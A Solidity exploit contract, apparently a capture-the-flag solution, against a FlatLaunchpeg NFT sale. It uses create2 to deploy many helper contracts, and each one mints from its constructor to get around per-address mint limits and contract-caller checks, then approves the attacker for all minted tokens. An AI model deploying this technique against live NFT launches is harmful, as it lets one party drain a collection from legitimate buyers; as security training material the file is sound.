// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";

// const collectionSize = 69;
// const maxperaddressduringmint = 5;

contract AttackContract{
    //an array off all addresses deployed
    address[] allcontractdeployed;

    /** 
    * @notice  constructor .runs on deployemnt of the contract. 
    * @dev      calls the attack function
    * @param   _attackerAddress  . The Address of the attacker,
    * @param   _FlatLaunchpeg  . The FlatLaunchpeg address
    **/
    constructor(address _attackerAddress, address _FlatLaunchpeg){
        attack(_attackerAddress,_FlatLaunchpeg);
    }

    /**
     * @notice  A function to compute the bytecode of a contract to be deployed
     * @dev     The function returns the bytecode of the Mint contract bytecode encoded with the constructor argument
     * @param   _attackerAddress  The attacker address [mint constructor argument]
     * @param   _amount  The amount of nft to be minted [mint constructor argument]
     * @param   _FlatLaunchpeg   The address of the FlatLaunchpeg contract [mint constructor argument]
     * @return  bytes The bytes of the contract
    */
    function getContractBytecode(address _attackerAddress, uint _amount, address _FlatLaunchpeg) internal pure returns (bytes memory) {
        bytes memory bytecode = type(Mint).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_attackerAddress,_amount, _FlatLaunchpeg));
    }

  /**
     * @notice  A function to deploy a contract and return its address
     * @dev     The function deploys a new contract with the given constructor arguments and a precomputed salt value
     *          The function returns the address of the Deployed contract upon successful deployment and reverts upon failure.
     * @param   salt   A unique uint256 used for the uniqueness of the contract to be deployed
     * @param   bytecode The bytecode of the contract to be deployed
     * @return  contractAddress The contract address of the newly deployed contract
    */
    function createContract(uint salt, bytes memory bytecode) internal returns (address contractAddress){
        assembly {
            contractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(contractAddress)) {
                revert(0, 0)
            }
        }
    }


      /**
     * @notice  A function to deploy more than one Mint Contracts  
     * @dev     The function calls the createContract function passing in the arguments requires and push the addresses to an array
     * @param   _attackerAddress   The attacker address
     * @param   _FlatLaunchpeg The address of the FlatLaunchpeg contract 
    */
    function attack(address _attackerAddress, address _FlatLaunchpeg) public{
        // 69/5 
        uint lenght = 13;
        uint remainder = 4;
        uint amountTomint = 5;
        //(13*5) + 4 = 69

        bytes memory contractByte =  getContractBytecode(_attackerAddress, amountTomint, _FlatLaunchpeg);

        for(uint256 i=0; i<lenght; i++){    
            allcontractdeployed.push(createContract(i, contractByte));
        }

        allcontractdeployed.push(createContract(13, getContractBytecode(_attackerAddress, remainder, _FlatLaunchpeg)));
    }

    /**
     * @notice  A function to return all the address of the contract deployed
    */
    function returnAlladdress() public view returns(address[] memory){
        return allcontractdeployed;
    }

}

contract Mint{

    /** 
    * @notice  constructor .runs on deployemnt of the contract. 
    * @dev      calls the publicSaleMint and setApprovalForAll function of the FlatLaunchpeg contract. It mint nft and set approval of the nft to the attacker address
    * @param   _attackerAddress  . The Address of the attacker,
    * @param   _FlatLaunchpeg  . The FlatLaunchpeg address
    **/
     constructor(address _attackerAddress, uint amount, address _FlatLaunchpeg){
        FlatLaunchpeg FlatLaunchpegContract = FlatLaunchpeg(_FlatLaunchpeg);
        FlatLaunchpegContract.publicSaleMint(amount);
        FlatLaunchpegContract.setApprovalForAll(_attackerAddress, true);
    }
}


